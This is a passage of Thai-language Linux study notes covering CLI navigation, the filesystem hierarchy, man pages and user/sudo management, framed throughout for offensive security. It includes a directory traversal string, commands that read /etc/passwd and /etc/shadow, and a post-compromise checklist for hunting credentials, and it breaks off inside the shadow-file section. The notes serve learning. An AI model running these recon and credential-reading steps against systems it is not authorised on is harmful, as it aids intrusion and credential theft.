# 🐧 Linux Fundamentals & CLI Architecture

> **Phase:** `Phase A — Core Foundations` | **Tags:** `#linux` `#foundations` `#cli` `#sysadmin`  
> **Status:** ✅ Completed | **Focus:** Linux Command Line, Filesystem, Permissions & Daemons

---

## 📑 Core Modules Overview

- [x] [[#Module 01: Linux CLI Philosophy & Navigation|Module 01: ปรัชญา Linux & เริ่มต้น CLI]]
- [x] [[#Module 02: Linux Filesystem Hierarchy|Module 02: โครงสร้าง Filesystem Hierarchy]]
- [x] [[#Module 03: System Manuals & Troubleshooting|Module 03: การใช้ man, --help และการแก้ปัญหา]]
- [x] [[#Module 04: User Privileges & Sudoers Architecture|Module 04: Users, Groups & สิทธิ์ Sudo]]
- [x] [[#Module 05: Package Management & Tool Installations|Module 05: Package Management (apt, dpkg, git, pip)]]
- [x] [[#Module 06: Systemd Services & Daemon Management|Module 06: ควบคุม Systemd Services]]
- [x] [[#Module 07: Process Monitoring & Signal Handling|Module 07: Process Management & Signals]]
- [x] [[#Module 08: Lightweight Web Services & HTTP Querying|Module 08: Web Server & curl]]
- [x] [[#Module 09: Terminal Productive Workflows & Aliases|Module 09: คีย์ลัด Terminal และเทคนิคคำสั่ง]]
- [x] [[#Module 10: System Diagnostic Breakdown & Recovery|Module 10: การวิเคราะห์และกู้คืนเมื่อระบบพัง]]

---

## Module 01: Linux CLI Philosophy & Navigation
- **Status:** ✅ Completed
- **Core Concept:** ทำไมแฮกเกอร์ถึงใช้ Linux? (Open-source, ควบคุมระดับ Kernel, น้ำหนักเบา, Automate ผ่าน CLI ได้ 100%)

### 📝 Key Notes & Mindset
- Linux ไม่ใช่แค่ OS เดียว แต่คือ **Kernel** ที่ถูกนำมาแจกจ่ายเป็น Distributions (Distros) เช่น Debian, Kali, Ubuntu, Arch
- วิศวกรความปลอดภัยใช้ CLI เพราะรวดเร็ว, ใช้ทรัพยากรน้อย, และสามารถส่ง Output จากคำสั่งหนึ่งต่อไปยังอีกคำสั่งหนึ่งผ่าน Pipe (`|`) ได้

### 💻 Essential Commands
```bash
# ตรวจสอบตัวตนผู้ใช้งานปัจจุบัน
whoami

# ตรวจสอบไดเรกทอรีปัจจุบัน (Print Working Directory)
pwd

# สำรวจรายชื่อไฟล์และไดเรกทอรี (Directory Listing)
ls                              # แสดงเฉพาะชื่อไฟล์และโฟลเดอร์ทั่วไป (ซ่อน Hidden Files)
ls -l                           # แสดงรายละเอียดเต็มยศ (Long Format: สิทธิ์, เจ้าของ, ขนาด, เวลา) แต่ยังซ่อน Hidden Files
ls -la                          # แสดงรายละเอียดเต็มยศ + เปิดเผย Hidden Files ทั้งหมด (-a = all เช่น .bashrc, .ssh)

# สลับไปยังไดเรกทอรีที่ต้องการ
cd /etc

# ถอยกลับไปยัง Parent Directory 1 ระดับ (Relative Path)
cd ..

# ทางลัดนำทางด่วน (Navigation Shortcuts)
cd ../..       # ถอยกลับ 2 ระดับรวดเดียว
cd -           # สลับกลับไปยังไดเรกทอรีล่าสุดที่เพิ่งจากมา (เสมือนปุ่ม Back)
cd ~           # กลับสู่ Home Directory ทันที (หรือพิมพ์แค่ cd เปล่าๆ)

# ตรวจสอบเวอร์ชันของ Kernel และสถาปัตยกรรมระบบ
uname -a

# ล้างหน้าจอ Terminal (หรือกด Ctrl + L)
clear
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
1. **สัจธรรมของ Linux และการตัดทิ้ง GUI:** Linux เป็นทั้ง Kernel และสถาปัตยกรรมระบบปฏิบัติการที่เน้นความเร็วและประสิทธิภาพระดับฮาร์ดแวร์ การตัดการพึ่งพา Graphical User Interface (GUI) แล้วควบคุมผ่าน Command Line Interface (CLI) 100% ทำให้ใช้ทรัพยากรน้อย ปราศจาก Overhead และสามารถควบคุมเครื่องเซิร์ฟเวอร์จากระยะไกลผ่าน SSH ได้อย่างสมบูรณ์แบบ
2. **สถาปัตยกรรมอำนาจและการนำทาง (Terminal Situational Awareness):** การรู้ตัวตน (`whoami`), ตำแหน่งที่ยืนอยู่ (`pwd`), รายละเอียดสเปกเคอร์เนลและสถาปัตยกรรมของเครื่อง (`uname -a`) คือก้าวแรกของการประเมินสถานการณ์ ไม่ว่าจะในฐานะผู้ดูแลระบบหรือแฮกเกอร์ที่เพิ่งเจาะเข้าระบบได้สำเร็จ

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. การทำงานบน Linux CLI มีความเป็น Case-sensitive สูงมาก (ตัวพิมพ์เล็ก-ใหญ่มีผลต่างกันโดยสิ้นเชิง)
2. สัญลักษณ์ `..` (Parent Directory) สำคัญมาก เพราะเป็นรากฐานของช่องโหว่ Directory Traversal (`../../../../etc/passwd`) ในสาย Web App Pentest
3. **กายวิภาคของคำสั่ง `ls`: `plain` vs `-l` vs `-la`:**
   - `ls` เดี่ยวๆ: แสดงเฉพาะชื่อไฟล์ทั่วไป ไม่บอกขนาด ไม่บอกสิทธิ์ และไม่เห็นไฟล์ซ่อน (Dotfiles)
   - `ls -l` (Long Listing): แสดงรายละเอียดโครงสร้าง 7 คอลัมน์ (Permissions, Links, Owner, Group, Size, Timestamp, Name) แต่ยังคงซ่อนไฟล์ดอต
   - `ls -la`: ผนวกแฟล็ก `-a` เพื่อเปิดเผยไฟล์คอนฟิกซ่อนทั้งหมด (เช่น `.bashrc`, `.ssh`, `.env`) ซึ่งเป็นขุมทรัพย์สำคัญของสาย OffSec ในการค้นหา Credentials

---

## Module 02: Linux Filesystem Hierarchy
- **Status:** ✅ Completed
- **Core Concept:** ผ่าโครงสร้างระบบไฟล์ของ Linux ทุกสิ่งทุกอย่างใน Linux คือ 'ไฟล์' (Everything is a file — แม้กระทั่ง Hardware, Process, และ Network Socket)

### 📝 Directory Hierarchy Reference
| Directory | Purpose / Typical Contents | OffSec Relevance |
| :--- | :--- | :--- |
| `/` | Root ของระบบไฟล์ทั้งหมด (จุดเริ่มต้นของทุก Path) | ฐานทัพหลักของระบบ ทุกการโจมตีต้องเข้าใจ Absolute Path จากจุดนี้ |
| `/bin`, `/usr/bin` | เก็บ Binary คำสั่งมาตรฐานของระบบ (`ls`, `cat`, `grep`, `bash`) | แหล่งหา Living off the Land Binaries (LOLBins) เพื่อหลบเลี่ยงการตรวจจับ |
| `/sbin`, `/usr/sbin` | เก็บ Binary สำหรับผู้ดูแลระบบ (System Admin binaries: `iptables`, `fdisk`) | คำสั่งสำหรับบริหารจัดการและยกระดับสิทธิ์ |
| `/etc` | เก็บไฟล์การตั้งค่าระบบ (Configuration files) | ขุมทรัพย์ข้อมูลลับ: Password hashes (`/etc/shadow`), รายชื่อผู้ใช้ (`/etc/passwd`), คอนฟิกเน็ตเวิร์ก |
| `/home` | พื้นที่จัดเก็บไฟล์ส่วนตัวของ User ทั่วไป (`/home/username`) | จุดล่าไฟล์ Credential, กุญแจ SSH (`~/.ssh`), และประวัติคำสั่ง `.bash_history` |
| `/root` | Home directory ของผู้ใช้สิทธิ์สูงสุด (Root user) | Crown Jewel — เป้าหมายสุดท้ายของการยึดครองระบบ |
| `/boot` | ไฟล์ Bootloader, Kernel Images (`vmlinuz`), GRUB config | ส่องเวอร์ชัน Kernel หาช่องโหว่ หรือทำ Bootkit / แก้ไขพารามิเตอร์ Boot |
| `/dev` | เก็บ Device files ของฮาร์ดแวร์ (`/dev/sda`, `/dev/urandom`, `/dev/null`) | อ้างอิง Raw Disk, สร้าง Payload จาก Random Byte, หรือทิ้ง Output ด้วย `> /dev/null 2>&1` |
| `/lib`, `/lib64`, `/usr/lib` | Shared Libraries (`.so`) ที่ Binary ต่าง ๆ ต้องใช้รัน | จุดโจมตีประเภท Shared Object Hijacking / LD_PRELOAD Privilege Escalation |
| `/mnt` | จุดเมานต์ชั่วคราวสำหรับไดรฟ์ภายนอกหรือ Network Shares (NFS, SMB) | ขุมทรัพย์หา Backup Files ที่ไม่ได้เข้ารหัส หรือ NFS Share ที่หลละหลวม (`no_root_squash`) |
| `/media` | จุดเมานต์อัตโนมัติสำหรับ Removable Media (USB Thumbdrive, External SSD) | ตรวจสอบสื่อบันทึกข้อมูลภายนอกที่เสียบคาไว้, เป้าหมายขโมยข้อมูล (Data Exfiltration) |
| `/opt` | เก็บซอฟต์แวร์บุคคลที่สาม (Third-party Add-on Software / Standalone Apps) | แหล่งส่องหา Custom Tools, ซอฟต์แวร์เฉพาะทางขององค์กรที่มีช่องโหว่ หรือ Hardcoded Secrets |
| `/srv` | เก็บข้อมูลสำหรับ Service ที่ระบบให้บริการ (Site-specific data: Web, FTP) | ส่องหา Source Code ของ Web App, ฐานข้อมูล หรือ Assets ที่ระบบแชร์ออกมาภายนอก |
| `/tmp` | เก็บไฟล์ชั่วคราว ทุกคนเขียนได้ (`rwxrwxrwt` - Sticky Bit) | พื้นที่ยอดนิยมสำหรับดร็อป Exploit, Reverse Shell Payloads, และ Compile โค้ด |
| `/usr`, `/usr/share` | แหล่งรวม Binary รอง, คู่มือ (`man`), และ Shared Data Assets | บน Kali นี่คือคลังเครื่องมือ: Wordlists (`/usr/share/wordlists`), Nmap Scripts, Web Shells |
| `/var` | ข้อมูลที่เปลี่ยนแปลงตลอดเวลา: Logs (`/var/log`), Spool, Web Root (`/var/www/html`) | แหล่งวิเคราะห์ Log แกะรอย/ลบร่องรอย และจุดวาง Web Shell บนเว็บเซิร์ฟเวอร์ |
| `/proc`, `/sys` | Virtual Filesystem ใน RAM ส่องดูสถานะ Kernel, ฮาร์ดแวร์ และ Processes | อ่านข้อมูลระบบสด: `/proc/version`, `/proc/cmdline`, ส่อง Process Memory ผ่าน `/proc/<PID>/` |
| `/run` | เก็บสถานะ Runtime ชั่วคราวตั้งแต่เปิดเครื่อง (PID files, UNIX Domain Sockets) | สำรวจ Active Sockets และ IPC (Inter-Process Communication) เพื่อหาช่องทาง Lateral Movement |

### 💻 Essential Commands
```bash
# สำรวจไดเรกทอรีราก
cd /
ls -la

# ดูโครงสร้างแบบต้นไม้ (เจาะลึก 1 ระดับ)
tree -L 1 /

# สำรวจซอฟต์แวร์เพิ่มเติมและจุดเมานต์ระบบ (Third-party, Mounts, Removable)
ls -la /opt                     # สำรวจโฟลเดอร์ซอฟต์แวร์เสริม (มักพบเครื่องมือเฉพาะของเป้าหมาย)
ls -la /mnt                     # สำรวจไดรฟ์หรือ Network Shares ที่เมานต์ไว้
ls -la /media                   # สำรวจ Flash Drive / Removable Media ที่เชื่อมต่ออยู่

# สร้างโฟลเดอร์ทดลองพร้อมโฟลเดอร์ย่อย
mkdir -p ~/lab/test_dir

# สร้างไฟล์เปล่า
touch ~/lab/test_dir/note.txt

# อ่านเนื้อหาในไฟล์ออกมาแสดงผลบน Terminal (Concatenate)
cat ~/lab/test_dir/note.txt
cat -n /etc/issue               # แสดงเนื้อหาพร้อมกำกับหมายเลขบรรทัด (-n)
cat /etc/os-release             # เปิดอ่านข้อมูล OS ประจำเครื่อง (Reconnaissance พื้นฐาน)

# สำรวจการตั้งค่าเครือข่ายใน /etc (Network Configuration)
# ข้อควรจำ: /etc/network เป็น Directory (หากพิมพ์ cat /etc/network ระบบจะแจ้งว่า "Is a directory")
cat /etc/network/interfaces     # เปิดอ่านไฟล์กำหนดค่า IP / Network Interfaces ในเครื่อง Debian/Kali
cat /etc/resolv.conf            # เปิดอ่านการตั้งค่า DNS Nameserver ที่เครื่องใช้อยู่
cat /etc/hosts                  # เปิดอ่านรายการจับคู่ IP กับ Domain ภายในเครื่อง (Local Hostname)

# ย้ายและเปลี่ยนชื่อไฟล์
mv ~/lab/test_dir/note.txt ~/lab/test_dir/targets.txt

# คัดลอกไฟล์
cp ~/lab/test_dir/targets.txt ~/lab/targets_backup.txt

# ลบไฟล์และโฟลเดอร์แบบ Recursive Force
rm -rf ~/lab/test_dir

# ตรวจสอบตำแหน่ง Binary ของคำสั่งใน Filesystem (ค้นหาตามตัวแปร $PATH)
which ls                        # ผลลัพธ์: /usr/bin/ls (พิสูจน์ว่าคำสั่งคือไฟล์ binary ในระบบไฟล์)
which cat                       # ผลลัพธ์: /usr/bin/cat

# สร้างผู้ใช้งานใหม่ในระบบ (สังเกตการสร้างโฟลเดอร์ใน /home และเขียนข้อมูลลง /etc/passwd)
sudo adduser newuser
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
1. **ปรัชญา "Everything is a file":** ทุกสิ่งทุกอย่างในระบบปฏิบัติการ Linux ถูกแสดงผลและควบคุมในรูปของไฟล์ ไม่ว่าจะเป็นอุปกรณ์ฮาร์ดแวร์ใน `/dev`, ข้อมูลโปรเซสและเคอร์เนลใน `/proc`, หรือการตั้งค่าคอนฟิกใน `/etc` แม้กระทั่งการสร้างผู้ใช้ใหม่ด้วย `adduser` เบื้องหลังก็คือการสร้างไดเรกทอรีบ้านใน `/home/<user>` และเขียนข้อความบรรทัดใหม่ต่อท้ายไฟล์ `/etc/passwd`
2. **คำสั่งไม่มีเวทมนตร์ (Executable Binaries & Filesystem):** คำสั่งมาตรฐานที่เราพิมพ์ลงใน Terminal เช่น `ls` หรือ `cat` แท้จริงแล้วไม่ใช่คำสั่งในอากาศ แต่เป็นไฟล์โปรแกรมคอมไพล์แล้ว (Executable Binary) ที่เก็บอยู่ในไดเรกทอรี `/bin` หรือ `/usr/bin` ซึ่งระบบจะค้นหาและโหลดมาประมวลผลตามเส้นทางที่กำหนดไว้ในตัวแปร `$PATH`

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. การทดลอง `cd /bin` แล้วใช้ `sudo cp ls newls` ทำให้เราเรียกใช้ `newls` แทน `ls` ได้ทันที — ในสาย Offensive Security นี่คือแนวคิดของ **Binary Renaming / LOLBins / Persistence** เพื่อหลบเลี่ยงการตรวจจับ
2. การเรียกใช้คำสั่งจะวิ่งค้นหาตามโฟลเดอร์ในตัวแปร `$PATH` (ตรวจสอบตำแหน่งจริงของคำสั่งได้ด้วย `which`)
3. โฟลเดอร์ `/etc/network` เป็น Directory ไม่ใช่ไฟล์ การจะอ่านคอนฟิกต้องระบุไฟล์เจาะจง เช่น `cat /etc/network/interfaces`

---

## Module 03: System Manuals & Troubleshooting
- **Status:** ✅ Completed
- **Core Concept:** การหาตัวช่วยเมื่อจำคำสั่งหรือ Flag ไม่ได้ แฮกเกอร์ตัวจริงไม่ได้จำทุกตัวอักษร แต่ 'ค้นหาคู่มือเป็นในเสี้ยววินาที'

### 📝 Key Notes & Mindset
- `man` คือคู่มือทางการที่สมบูรณ์ที่สุด แบ่งเป็น Sections:
  - Section 1: User Commands (`man 1 ls`)
  - Section 5: File Formats (`man 5 passwd`)
  - Section 8: System Administration (`man 8 useradd`)
- เมื่อไม่มี `man` ให้ลอง `--help` หรือ `-h` สำหรับ Quick Option Cheatsheet
- การอ่านคู่มือคำสั่ง `ps` (`man ps`): ตัวอย่างคลาสสิกของคำสั่งที่มี 2 ไวยากรณ์ คือ Unix/POSIX Style (มีขีด เช่น `ps -ef`) และ BSD Style (ไม่มีขีด เช่น `ps aux`)
- **OffSec Situational Awareness:** คำสั่งสำรวจระบบเบื้องต้นที่รวมอยู่ในบทนี้ ไม่ใช่แค่คำสั่งจำทั่วไป แต่คือชุดคำสั่ง **"Initial Triage Checklist"** ที่แฮกเกอร์ใช้สำรวจเครื่องเหยื่อทันทีที่ได้ Initial Shell (ใคร, ที่ไหน, รันอะไร, มีใครเฝ้าจออยู่, มีพอร์ตไหนเปิดภายใน)

### 💻 Essential Commands
```bash
# เปิดคู่มือฉบับเต็มของคำสั่ง (กด q ออก, กด / เพื่อพิมพ์ค้นหาคำ)
man ls

# ดูคำอธิบายสั้น ๆ บรรทัดเดียวว่าคำสั่งนี้คืออะไร
whatis nmap

# ค้นหาคำสั่งที่เกี่ยวข้องจากคำค้นหา (เมื่อนึกชื่อคำสั่งไม่ออก)
apropos "network"

# แสดงคำอธิบายตัวเลือก (Option Cheatsheet) แบบละเอียดในหน้าจอ
ls --help
id -h 2>&1 | head -n 5          # ตัวอย่างการใช้ Flag ย่อ -h

# ดู Path ของ Binary ที่ถูกเรียกใช้งานจริงตาม $PATH
which python3

# แสดงตำแหน่งทั้ง Binary, Source Code และ Man page
whereis bash

# ตรวจสอบว่าเป็น Built-in ของ Shell หรือ External Binary
type cd
type ls

# ตรวจสอบ User ID (UID), Group ID (GID) และกลุ่มที่สังกัด
id

# แสดงรายชื่อผู้ใช้ที่กำลังล็อกอินอยู่ในระบบขณะนี้
who

# แสดงชื่อเครื่องของระบบคอมพิวเตอร์ปัจจุบัน
hostname

# ตรวจสอบสถาปัตยกรรมและเวอร์ชัน Kernel
uname
uname -r                        # แสดงรุ่น Kernel Release (สำคัญมากในการหา Kernel Exploit)
uname -a                        # แสดงข้อมูลระบบแบบสมบูรณ์

# สำรวจเครือข่ายและ Network Interface (เปรียบเทียบคำสั่งเก่า vs ใหม่)
ifconfig                        # ตรวจสอบ IP Address (คำสั่งคลาสสิกจากชุด net-tools)
ip a                            # ตรวจสอบ IP Address (คำสั่งมาตรฐานสมัยใหม่จากชุด iproute2)

# สำรวจพอร์ตและเซอร์วิสที่เปิดรับการเชื่อมต่อ (Listening Ports)
netstat -tulpn                  # ตรวจสอบพอร์ต (คำสั่งคลาสสิก)
ss -tulpn                       # Socket Statistics (คำสั่งมาตรฐานสมัยใหม่)

# แสดงโครงสร้าง Block Devices (ฮาร์ดดิสก์, SSD, พาร์ติชัน, จุดเมานต์)
lsblk

# แสดงรายการอุปกรณ์ USB ทั้งหมดที่เชื่อมต่อกับเครื่อง
lsusb

# แสดงไฟล์ทั้งหมดที่กำลังถูกเปิดใช้งาน (List Open Files)
lsof

# แสดงตัวแปรสภาพแวดล้อมทั้งหมด (Environment Variables)
env

# ตรวจสอบ Process ที่กำลังทำงานในระบบ (Process Status)
ps                              # ดู Process ที่รันอยู่ใน Terminal Session ปัจจุบัน
ps aux                          # ส่องทุก Process ในระบบแบบละเอียด (BSD Style)
ps -ef                          # ส่องทุก Process พร้อมระบุ Parent PID (PPID) (Unix Style)
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
1. **สัญลักษณ์แห่งอำนาจบน Terminal (`$` vs `#`):** อักขระตัวสุดท้ายของ Shell Prompt สะท้อนระดับสิทธิ์ในการควบคุมเครื่องอย่างชัดเจน เครื่องหมาย `$` บ่งบอกถึงผู้ใช้ธรรมดา (Standard User) ที่มีขอบเขตจำกัด ขณะที่เครื่องหมาย `#` บ่งบอกถึง `root` ผู้ถือครองสิทธิ์เด็ดขาดสูงสุดในการอ่าน เขียน และสั่งการระบบ
2. **ศาสตร์แห่ง Host Situational Awareness (60 วินาทีแรกหลังเจาะระบบ):** แฮกเกอร์และผู้ดูแลระบบไม่ได้จำคำสั่งทุกตัวในโลก แต่มีความชำนาญในการเปิดคู่มือ (`man`, `whatis`, `apropos`) และใช้ชุดคำสั่งตรวจจับสภาพแวดล้อม (`uname -r`, `id`, `ip a`, `ss`, `env`, `ps`) เพื่อทำความเข้าใจสภาพแวดล้อมและค้นหาช่องโหว่ของเป้าหมายในทันที

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. คำสั่งสำรวจสถานะเครื่องคือ "ขุมทรัพย์ข่าวกรอง": `uname -r` ใช้หาช่องโหว่ Kernel เพื่อยกระดับสิทธิ์, `id` ส่องว่าอยู่ในกลุ่มที่แอบมีสิทธิ์พิเศษไหม, `ss -tulpn` ส่องหาเซอร์วิสภายในเครื่องที่แอบรันอยู่ (เช่น Database ที่ไม่เปิดให้โลกภายนอกเห็น), และ `env` ส่องหา Credentials / API Keys ที่แอดมินลืมทิ้งไว้
2. ในวงการลินุกซ์กำลังเปลี่ยนผ่านจากคำสั่งยุคเก่าสู่ยุคใหม่: `ifconfig` $\rightarrow$ `ip a` และ `netstat` $\rightarrow$ `ss` โดยคำสั่งใหม่ทำงานเร็วกว่าและเป็นมาตรฐานปัจจุบัน แต่ข้อสอบและระบบ Enterprise เก่า ๆ ยังคงมีให้ใช้ทั้งสองแบบ
3. คำสั่งตรวจสอบอุปกรณ์ USB สะกดว่า `lsusb` (ย่อมาจาก List USB)

---

## Module 04: User Privileges & Sudoers Architecture
- **Status:** ✅ Completed
- **Core Concept:** สถาปัตยกรรมสิทธิ์ผู้ใช้งาน (Access Control): Root (UID 0) คือพระเจ้า การบริหารจัดการ Users, Groups และกลไกยกระดับสิทธิ์ผ่าน `sudo`

### 📝 Key Notes & Mindset
- ข้อมูลผู้ใช้เก็บใน `/etc/passwd` (อ่านได้ทุกคน) และ Hash รหัสผ่านเก็บใน `/etc/shadow` (อ่านได้เฉพาะ root)
- การให้สิทธิ์คำสั่งแบบไม่ถามรหัสผ่าน (NOPASSWD) ใน `/etc/sudoers` คือช่องโหว่ Privilege Escalation อันดับต้น ๆ

### 💻 Essential Commands
```bash
# ดู UID, GID และ Groups ของ User ปัจจุบัน
id

# แสดงรายชื่อกลุ่มทั้งหมดที่สังกัดอยู่ (Group Memberships)
groups
groups operator1                # ตรวจสอบกลุ่มที่ User อื่นสังกัดอยู่

# ตรวจสอบรายชื่อผู้ใช้งานและโครงสร้างสิทธิ์ทั้งหมดในระบบ (อ่านได้ทุกคน)
cat /etc/passwd

# ตรวจสอบรายชื่อกลุ่มและสมาชิกในแต่ละกลุ่มทั้งหมดในระบบ (อ่านได้ทุกคน)
cat /etc/group

# ตรวจสอบโครงสร้างไฟล์จัดเก็บ Hash รหัสผ่าน (ต้องใช้สิทธิ์ sudo / root เท่านั้นในการเปิดอ่าน)
sudo cat /etc/shadow

# สร้าง User ใหม่แบบ Interactive Wizard (สร้าง Home dir, ถามรหัสผ่าน และข้อมูลผู้ใช้ให้อัตโนมัติ)
sudo adduser operator1

# สร้าง User ใหม่ระดับ Low-level Command (ต้องระบุ Flag สร้าง Home dir และ Default Shell เอง)
sudo useradd -m operator1               # สร้าง User พร้อมสร้าง Home Directory (-m = create home)
sudo useradd -m -s /bin/bash operator1  # สร้าง User พร้อม Home Directory และกำหนด Default Shell

# ตั้งรหัสผ่านหรือเปลี่ยนรหัสผ่านให้ User
sudo passwd operator1

# สร้างกลุ่มผู้ใช้งานใหม่ในระบบ (บันทึกข้อมูลกลุ่มลงใน /etc/group)
sudo groupadd secops

# แก้ไขข้อมูลผู้ใช้ (User Modify: เพิ่ม User เข้ากลุ่มรอง -aG = append to supplementary group)
sudo usermod -aG sudo operator1
sudo usermod --shell /bin/bash operator1 # แก้ไข Default Shell ประจำตัวผู้ใช้ (-s หรือ --shell)
sudo usermod -l newname oldname         # เปลี่ยนชื่อบัญชี Login ใหม่ (-l <ชื่อใหม่> <ชื่อเดิม>)
sudo usermod -L operator1               # สั่งล็อคบัญชีผู้ใช้ (Lock: ใส่ ! ใน /etc/shadow)
sudo usermod -U operator1               # สั่งปลดล็อคบัญชีผู้ใช้ (Unlock: เอา ! ออกจาก /etc/shadow)

# ถอดผู้ใช้งานออกจากกลุ่ม (Remove User from Group: -d <ชื่อผู้ใช้> <ชื่อกลุ่ม>)
sudo gpasswd -d operator1 secops

# สลับเป็น Root เต็มรูปแบบ (เมื่อไม่ระบุชื่อ User ระบบจะ Default เป็น root เสมอ)
sudo su -                       # สลับเป็น root ผ่าน sudo (หรือใช้ su - หากรู้รหัสผ่าน root)

# สลับไปยัง User อื่น (เครื่องหมาย - เพื่อโหลด Environment และ Home ของ User นั้น)
su - operator1

# ออกจาก Session ของผู้ใช้ที่สลับมา เพื่อกลับสู่ผู้ใช้เดิม (หรือกด Ctrl + D)
exit

# ตรวจสอบสิทธิ์ sudo ที่ตัวเองสามารถรันได้ (หัวใจของ Privilege Escalation Recon)
sudo -l

# แก้ไขไฟล์กำหนดสิทธิ์ sudo อย่างปลอดภัย (visudo มี Syntax Check ป้องกันระบบล็อคตาย)
sudo visudo

# ลบ User พร้อมลบ Home Directory ทิ้งทั้งหมด
sudo userdel -r operator1

# ลบกลุ่มผู้ใช้งานออกจากระบบ
sudo groupdel secops
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
1. **สถาปัตยกรรมสิทธิ์ผูกติดกับตัวเลข UID (`UID 0` is King):** ในระบบปฏิบัติการ Linux อำนาจในการเข้าถึงทรัพยากรไม่ได้ขึ้นอยู่กับชื่อตัวอักษร "root" แต่ผูกติดอยู่กับหมายเลข User ID (UID) หากบัญชีใดก็ตามมีค่า `UID 0` บัญชีนั้นจะกลายเป็น Root ทันทีในสายตาของ Kernel
2. **การแยกข้อมูลสาธารณะและข้อมูลลับ (`/etc/passwd` vs `/etc/shadow`):** โครงสร้างระบบ Linux จงใจแยกฐานข้อมูลผู้ใช้ออกเป็นสองส่วน: `/etc/passwd` มีสิทธิ์เป็น World-readable (`644`) เพื่อให้ทุกโปรแกรมในเครื่องสามารถตรวจสอบว่าไฟล์นี้เป็นของ UID/GID ใด ส่วน Salted Password Hash จะถูกกักเก็บไว้อย่างแน่นหนาใน `/etc/shadow` ซึ่งอนุญาตให้เฉพาะ `root` อ่านได้เท่านั้น (`640` หรือ `600`) เพื่อป้องกันการทำ Offline Hash Cracking

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. **ผ่าโครงสร้าง 7 ฟิลด์ของ `/etc/passwd` (`username:password:UID:GID:GECOS:home_dir:shell`):** เมื่อใช้คำสั่ง `cat /etc/passwd` แล้วดูบรรทัดบัญชีผู้ใช้ เช่น `user:x:1000:1000:User Name,,,:/home/user:/bin/bash` แต่ละฟิลด์ที่คั่นด้วย `:` คือ:
   - `user` (Username): ชื่อบัญชีสำหรับล็อกอิน
   - `x` (Password Field): หมายถึงรหัสผ่านถูกปกป้องด้วย Shadow Passwords (ถูกย้ายไปเก็บที่ `/etc/shadow`) ในระบบโบราณเคยเก็บ Password Hash ไว้ที่นี่โดยตรง แต่เนื่องจาก `/etc/passwd` ต้องมี Permission เป็น `644` (World-readable เพื่อให้โปรแกรมต่าง ๆ รู้จัก UID ของผู้ใช้) จึงเสี่ยงต่อการถูก Dump ไปทำ Password Cracking หากเจอระบบที่ฟิลด์นี้ไม่ใช่ `x` แต่เป็น Hash หรือว่างเปล่า จะเป็นช่องโหว่ระดับ Critical ทันที
   - `1000` (User ID / UID): หมายเลขระบุตัวตนของผู้ใช้ (`0` = root เสมอ, `1–999` = System/Daemon Accounts, `1000+` = Normal/Regular Users)
   - `1000` (Group ID / GID): หมายเลขกลุ่มหลัก (Primary Group) ของผู้ใช้ ซึ่งตรงกับข้อมูลใน `/etc/group`
   - `GECOS` (`User Name,,,`): ข้อมูลรายละเอียดทั่วไปของผู้ใช้ (Full Name, Room Number, Phone) คั่นด้วยคอมม่า
   - `/home/user` (Home Directory): ไดเรกทอรีตั้งต้นเมื่อผู้ใช้ล็อกอินเข้าสู่ระบบ
   - `/bin/bash` (Default Shell): โปรแกรมเชลล์เริ่มต้นที่ถูกเรียกใช้งาน — หากเป็น `/usr/sbin/nologin` หรือ `/bin/false` จะไม่อนุญาตให้ล็อกอินเป็น Interactive Terminal (มักใช้กับบัญชีระบบเพื่อความปลอดภัย)
2. **ผ่าโครงสร้าง 9 ฟิลด์ของ `/etc/shadow` (`username:password:lastchanged:min:max:warn:inactive:expire:reserved`):** เมื่อใช้สิทธิ์ Root เปิดดูไฟล์ด้วย `sudo cat /etc/shadow` แต่ละฟิลด์ที่คั่นด้วย `:` มีความหมายทางเทคนิคและความปลอดภัยดังนี้:
   - `username`: ชื่อบัญชีผู้ใช้ (ตรงกับใน `/etc/passwd`)
   - `password` (Password Field / Hash): พื้นที่เก็บ Hash รหัสผ่านจริง ซึ่งมีความหมายเชิงลึกตามสัญลักษณ์ที่ปรากฏ:
     - **เครื่องหมาย `!` (Exclamation Mark):** หมายถึง **บัญชีถูกล็อค (Account Locked / Password Disabled)** ไม่อนุญาตให้ล็อกอินด้วย Password Authentication มักพบในบัญชีระบบ/Service daemons (เช่น `bin:!:...`, `daemon:!:...`) หรือ User ที่สร้างขึ้นใหม่แต่ยังไม่ได้ตั้งรหัสผ่านด้วย `passwd`
     - **เครื่องหมาย `*` (Asterisk):** มีผลลัพธ์เหมือน `!` คือปิดการใช้งานรหัสผ่านของบัญชีนั้น
     - **รูปแบบ `!$6$...` หรือ `!*`:** หากมี `!` นำหน้าข้อความ Hash แสดงว่าบัญชีนี้เคยมีรหัสผ่าน แต่ปัจจุบันถูกผู้ดูแลระบบสั่งล็อคไว้ชั่วคราว (เช่น ผ่านคำสั่ง `sudo passwd -l <user>`) ระบบจะนำเครื่องหมาย `!` มาแปะข้างหน้า Hash เพื่อทำให้ค่า Hash ไม่ตรงกับการคำนวณใด ๆ ส่งผลให้ล็อกอินไม่ผ่าน แต่ยังคง Hash เดิมไว้หากต้องการปลดล็อคในอนาคต
     - **สตริง Hash แบบเต็ม (`$id$salt$hash`):** หากบัญชีมีการตั้งรหัสผ่าน จะแสดงโครงสร้าง Hash ที่ถูก Salted เช่น:
       - `$id$`: หมายเลขอัลกอริทึม (`$1$` = MD5, `$2a$` / `$2y$` = Blowfish, `$5$` = SHA-256, `$6$` = SHA-512 มาตรฐาน Linux ยอดนิยม, `$y$` = yescrypt มาตรฐานใหม่ใน Debian 12/Kali เพื่อป้องกัน GPU Cracking)
       - `salt`: ข้อความสุ่มสำหรับผสมก่อนทำ Hash เพื่อป้องกันการโจมตีแบบ Rainbow Tables
       - `hash`: ค่า Hash ผลลัพธ์สุดท้าย
